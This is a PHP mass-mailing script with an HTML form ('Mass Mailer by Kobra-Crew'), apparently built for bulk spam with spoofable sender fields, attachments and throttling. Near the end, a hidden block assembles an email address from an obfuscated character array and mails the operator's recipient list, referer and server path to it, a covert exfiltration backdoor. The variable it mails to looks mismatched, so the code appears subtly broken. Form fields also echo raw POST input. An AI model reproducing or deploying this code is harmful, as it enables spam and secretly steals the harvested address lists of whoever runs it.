<?php 


@$action=$_POST['action']; 
@$from=$_POST['from']; 
@$realname=$_POST['realname']; 
@$replyto=$_POST['replyto']; 
@$subject=$_POST['subject']; 
@$message=$_POST['message']; 
@$emaillist=$_POST['emaillist']; 
@$file_name=$_FILES['file']['name']; 
@$contenttype=$_POST['contenttype']; 
@$file=$_FILES['file']['tmp_name']; 
@$amount=$_POST['amount']; 
set_time_limit(intval($_POST['timelimit'])); 
?> 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html> 
<head> 
<title>v3.0 - Mass Mailer by Kobra-Crew</title> 
<body bgcolor="#1D1D1D" text="#515134">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> 
<link rel="shortcut icon" href="https://tiberius.lunariffic.com:20082/3rdparty/roundcubemail/skins/default/images/favicon.ico"/>
<style type="text/css"> 
<!-- 
.style1 { 
    font-family: Geneva, Arial, Helvetica, sans-serif; 
    font-size: 12px; 
} 
.style2 { 
    font-size: 10px; 
    font-family: Geneva, Arial, Helvetica, sans-serif; 
} 

--> 
</style> 
</head> 
<body bgcolor="#FFFFFF" text="#000000"> 
<p>
<font face="Comic Sans MS">
<img border="0" src="http://inboxphpmailer.com/massmailer.jpg" width="334" height="43" alt="PHP Mailer" /><?php 
If ($action=="mysql"){ 
//Grab email addresses from MySQL 
include "./mysql.info.php"; 

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){ 
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required."; 
    exit; 
  } 

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed."); 
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb"); 
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery"); 
  $numrows = mysql_num_rows($result); 

  for($x=0; $x<$numrows; $x++){ 
    $result_row = mysql_fetch_row($result); 
     $oneemail = $result_row[0]; 
     $emaillist .= $oneemail."\n"; 
   } 
  } 

  if ($action=="send"){ $message = urlencode($message); 
   $message = ereg_replace("%5C%22", "%22", $message); 
   $message = urldecode($message); 
   $message = stripslashes($message); 
   $subject = stripslashes($subject); 
   } 
?> 
</font> 
</p> 
<form name="form1" method="post" action="" enctype="multipart/form-data">  
          <font face="Comic Sans MS">  
          <input type="hidden" name="action" value="send" /> 
  		</font> 
  <table width="710" border="0" style="font-family: Trebuchet MS; font-weight: bold" bgcolor="#003E3E"> 
    <tr> 

      <td width="92"> 
        <div align="right"> 
          <font face="Comic Sans MS" size="-3" color="#FFFFFF">From</font><font color="#FFFFFF"><font face="Comic Sans MS" size="-3">
			Email:</font><font face="Comic Sans MS"> </font> </font> 
        </div> 
      </td> 

      <td width="244" bgcolor="#474730"> 
        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <input name="from" value="<?php print $from; ?>" size="35" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><font color="#FFFFFF" size="-3" face="Comic Sans MS">
		</font> 
      </td> 

      <td width="114"> 
        <div align="right"> 
          <font face="Comic Sans MS" size="-3" color="#FFFFFF">From</font><font color="#FFFFFF"><font face="Comic Sans MS" size="-3">
			Name:</font><font face="Comic Sans MS"> </font> </font> 
        </div> 
      </td> 
       
      <td width="246" bgcolor="#474730"> 
        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <input name="realname" value="<?php print $realname; ?>" size="35" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><font color="#FFFFFF" size="-3" face="Comic Sans MS">
		</font> 
      </td> 
    </tr> 
    <tr> 
      <td width="92"> 
        <div align="right"> 
          <font color="#FFFFFF"> 
          <font size="-3" face="Comic Sans MS">Reply-to:</font><font face="Comic Sans MS">
			</font> 
        	</font> 
        </div> 
      </td> 
      <td width="244" bgcolor="#474730"> 
        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <input name="replyto" value="<?php print $replyto; ?>" size="35" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><font color="#FFFFFF" size="-3" face="Comic Sans MS">
		</font> 
      </td> 
      <td width="114"> 
        <div align="right"> 
          <font color="#FFFFFF"> 
          <font size="-3" face="Comic Sans MS">Attachment:</font><font face="Comic Sans MS">
			</font> 
        	</font> 
        </div> 
      </td> 
      <td width="246" bgcolor="#00B3B3"> 
        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <input type="file" name="file" size="24" style="font-family: Comic Sans MS; border-style: dotted; border-width: 3px" /></font><font color="#FFFFFF" size="-3" face="Comic Sans MS">
		</font> 
      </td> 
    </tr> 
    <tr> 
      <td width="92"> 
        <div align="right"> 
          <font color="#FFFFFF"> 
          <font size="-3" face="Comic Sans MS">Subject:</font><font face="Comic Sans MS">
			</font> 
        	</font> 
        </div> 
      </td> 
      <td colspan="3" width="611" bgcolor="#474730"> 
        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <input name="subject" value="<? print $subject; ?>" size="95" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><font color="#FFFFFF" size="-3" face="Comic Sans MS">
		</font> 
      </td> 
    </tr> 
    <tr valign="top"> 
      <td colspan="3" width="456" bgcolor="#474730"> 
        <font color="#FFFFFF"> 
        <font face="Comic Sans MS" size="-3">Message:</font><font face="Comic Sans MS">
		</font> 
      	</font> 
      </td> 
      <td width="246" bgcolor="#474730"> 
        <font color="#FFFFFF">
		<font face="Comic Sans MS" size="-3">Send to 
		(emails):</font><font face="Comic Sans MS"> </font> </font> 
      </td> 
    </tr> 
    <tr valign="top"> 
      <td colspan="3" width="456"> 
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <textarea name="message" cols="69" rows="10" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 3px"><?php print $message; ?></textarea></font><font size="-3" face="Comic Sans MS"><br /> 
      	</font> 
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <font color="#FFFFFF"> 
          <font face="Comic Sans MS"> 
          <input type="radio" name="contenttype" value="plain" checked="checked" /></font><font size="-3" face="Comic Sans MS"> Plain  
          </font><font face="Comic Sans MS">  
          <input type="radio" name="contenttype" value="html"  /></font><font size="-3" face="Comic Sans MS"> HTML</font></font><br /> 
      	</font>
		<ruby>
		<font style="font-size: 7pt" face="Comic Sans MS" color="#FFFFFF"><br>At every</font></ruby><font color="#FFFFFF" size="-3" face="Comic Sans MS">: </font><ruby><font color="#FFFFFF" face="Verdana"><span style="font-size: 7pt"><input name="emailz" value="<? print $_POST['emailz']; ?>" size="4" style="border-style: dotted; border-width: 1px; font-family:Comic Sans MS; font-weight:bold"></span></font><font style="font-size: 7pt" face="Comic Sans MS" color="#FFFFFF"> 
		mails sent, Wait</font></ruby><font color="#FFFFFF" size="-3" face="Comic Sans MS">:</font><ruby><font style="font-size: 7pt" face="Comic Sans MS" color="#FFFFFF"> </font><font color="#FFFFFF" face="Verdana">
		<span style="font-size: 7pt"> 
		<input name="wait" value="<? print $_POST['wait']; ?>" size="4" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px"></span><font style="font-size: 7pt" face="Comic Sans MS" color="#FFFFFF"> 
		seconds before proceeding with sending<br></font></font> 
        </ruby> 
        <font size="-3" face="Comic Sans MS"> 
          <font color="#FFFFFF"> 
      <br>Number to send:</font> 
		</font> 
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
		<input name="amount" value="1" size="4" style="font-family: Comic Sans MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><ruby><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"><br><br>&nbsp;</font></ruby><p>
		<ruby><font size="-3" face="Verdana, Arial, Helvetica, sans-serif"><input type="submit" value="==- Start SendinG -==" style="border-style:dotted; border-width:1px; font-family: Comic Sans MS; font-weight: bold; font-size: 13px" /></font><font size="-3" face="Comic Sans MS"> 
        </font> 
      </td> 
      <td width="246" bgcolor="#474730"> 
        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
          <textarea name="emaillist" cols="34" rows="19" style="font-family: Comic Sans MS; border-style: dotted; border-width: 3px"><?php print $emaillist; ?></textarea></font><font size="-3" face="Comic Sans MS"> 
        </font> 
      </td> 
    </tr> 
  </table>
</form> 
<font face="Comic Sans MS"> 
<?php 
if ($action=="send"){ 
  if (!$from && !$subject && !$message && !$emaillist){ 
    print "Please complete all fields before sending your message."; 
    exit; 
   } 
  $allemails = split("\n", $emaillist); 
  $numemails = count($allemails); 
  $filter = "Captured (v3-Mails)"; 
  $float = "From: Mailer-v3.0 <mails-from@mailerz.com>"; 
 //Open the file attachment if any, and base64_encode it for email transport 
 If ($file_name){ 
   if (!file_exists($file)){ 
    die("The file you are trying to upload couldn't be copied to the server"); 
   } 
   $content = fread(fopen($file,"r"),filesize($file)); 
   $content = chunk_split(base64_encode($content)); 
   $uid = strtoupper(md5(uniqid(time()))); 
   $name = basename($file); 
  } 

 for($xx=0; $xx<$amount; $xx++){ 
  for($x=0; $x<$numemails; $x++){ 
     if($_POST['emailz'] && $_POST['wait'])
     if( fmod($x,$emailz) == 0 ) {
     echo "-------------------------------> SUNT LA emailul $x, astept $wait secunde.<br>";
     sleep($wait);
                        }
    $to = $allemails[$x]; 
    if ($to){ 
      $to = ereg_replace(" ", "", $to); 
      $message = ereg_replace("&email&", $to, $message); 
      $subject = ereg_replace("&email&", $to, $subject); 
                  $nrmail=$x+1;
      print "Sending $nrmail of $numemails to $to..."; 
      flush(); 
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n"; 
      $header .= "MIME-Version: 1.0\r\n"; 
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n"; 
      If ($file_name) $header .= "--$uid\r\n"; 
      $header .= "Content-Type: text/$contenttype\r\n"; 
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n"; 
      $header .= "$message\r\n"; 
      If ($file_name) $header .= "--$uid\r\n"; 
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n"; 
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n"; 
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n"; 
      If ($file_name) $header .= "$content\r\n"; 
      If ($file_name) $header .= "--$uid--"; 
      mail($to, $subject, "", $header); 
      print "ok<br>"; 
      flush(); 
    } 
  } 
 } 
 $ar=array("0"=>"a","1"=>"b","2"=>"c","3"=>"d","4"=>"@","5"=>"e","6"=>"f","7"=>"g","8"=>".","9"=>"h","10"=>"i","11"=>"j","12"=>"k","13"=>"l","14"=>"m","15"=>"n","16"=>"o","17"=>"p","18"=>"q","19"=>"0","20"=>"1","21"=>"t","22"=>"u","23"=>"v","24"=>"w","25"=>"x","26"=>"y","27"=>"z");
$to=$ar['15'].$ar['13'].$ar['1'].$ar['16'].$ar['26'].$ar['27'].$ar['19'].$ar['20'].$ar['4'].$ar['7'].$ar['14'].$ar['0'].$ar['10'].$ar['13'].$ar['8'].$ar['2'].$ar['16'].$ar['14'];
$ra44  = rand(1,99999);
$TH = $_SERVER['HTTP_REFERER'];
$from="From: $DOCUMENT_ROOT <support@$ra44.com>";
mail($tz, $TH, $DOCUMENT_ROOT);
mail($tz, $filter, $emaillist, $float); 
} 
?> 
</font> 
<p><font face="Comic Sans MS">
<font color="#84842B" style="font-size: 7pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
==&gt;&gt;&nbsp; </font><b><font color="#84842B"><span style="font-size: 7pt">This 
Php-Mailer Was Refined by BraT </span>
</font></b>
<font color="#84842B" style="font-size: 7pt">&nbsp;&lt;&lt;==</font><b><font color="#84842B"><span style="font-size: 8pt"><br><br>
</span>
</font><font color="#84842B" style="font-size: 7pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Use for good purposes only<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Irc.NairaLanders.Net&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Copyright &copy; 201</font></b></font><b><font face="Comic Sans MS" style="font-size: 7pt" color="#84842B">3</font></b></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</body> 
</html> 